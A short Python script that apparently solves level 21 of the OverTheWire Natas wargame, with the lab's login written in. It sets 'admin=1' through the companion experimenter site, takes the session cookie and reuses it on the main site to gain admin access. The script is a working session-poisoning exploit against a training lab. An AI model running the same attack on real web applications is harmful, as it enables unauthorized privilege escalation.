import requests
auth = ("natas21", "BPhv63cKE1lkQl04cE5CuFTzXe15NfiH")

experimenter_url = "http://natas21-experimenter.natas.labs.overthewire.org/"
payload = {"admin": "1", "submit": "Update", "debug": ""} 

r1 = requests.get(experimenter_url, params=payload, auth=auth)
phpsessid = r1.cookies['PHPSESSID']

main_url = "http://natas21.natas.labs.overthewire.org/"
r2 = requests.get(main_url, auth=auth, cookies={"PHPSESSID": phpsessid})

print("\n[✅] Main page output:")
print(r2.text)